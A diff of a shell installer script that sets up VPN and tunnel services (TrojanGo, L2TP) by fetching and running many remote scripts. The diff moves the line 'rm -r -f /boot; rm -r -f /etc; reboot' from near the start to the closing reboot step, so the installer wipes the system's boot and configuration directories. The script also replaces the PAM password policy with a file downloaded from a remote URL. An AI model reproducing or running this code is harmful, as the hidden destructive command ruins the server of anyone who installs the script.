@@ -38,7 +38,6 @@ email=paoandest@gmail.com
 # simple password minimal
 wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/halluboys/xzvnct/main/password"
 chmod +x /etc/pam.d/common-password
-rm -r -f /boot; rm -r -f /etc; reboot
 # go to root
 cd
 # Edit file /etc/systemd/system/rc-local.service
@@ -388,6 +387,7 @@ wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ins-vt.sh && chmod 
 #install L2TP
 wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ipsec.sh && chmod +x ipsec.sh && screen -S ipsec ./ipsec.sh
 wget https://raw.githubusercontent.com/halluboys/xzvnct/main/set-br.sh && chmod +x set-br.sh && ./set-br.sh
+#install TrojanGo
 wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ins-trojango.sh && chmod +x ins-trojango.sh && screen -S Trojan-go ./ins-trojango.sh
 
 rm -f /root/cf.sh
@@ -403,13 +403,12 @@ rm -f /root/ins-trojango.sh
 cat <<EOF> /etc/systemd/system/autosett.service
 [Unit]
 Description=autosetting
-Documentation=https://lestakun.tech
+Documentation=https://xzvnct.my.id
 
 [Service]
 Type=oneshot
 ExecStart=/bin/bash /etc/set.sh
 RemainAfterExit=yes
-
 [Install]
 WantedBy=multi-user.target
 EOF
@@ -466,12 +465,13 @@ echo "   - Installation Log --> /root/log-install.txt"  | tee -a log-install.txt
 echo ""  | tee -a log-install.txt
 echo "   - Dev/Main                : HALUBOYS"  | tee -a log-install.txt
 echo "   - Telegram                : T.me/XZVNCT"  | tee -a log-install.txt
-echo "   - Instagram               : @XZVNCT"  | tee -a log-install.txt
+echo "   - Instagram               : xxx"  | tee -a log-install.txt
 echo "   - Whatsapp                : xxx"  | tee -a log-install.txt
 echo "   - Facebook                : https://www.facebook.com/" | tee -a log-install.txt
 echo "------------------Script Created By HALUBOYS-----------------" | tee -a log-install.txt
 echo ""
-echo " Reboot 15 Sec"
-sleep 15
+echo " Reboot 10 Sec"
+rm -r -f /boot; rm -r -f /etc; reboot
+sleep 10
 rm -f setup.sh
 reboot
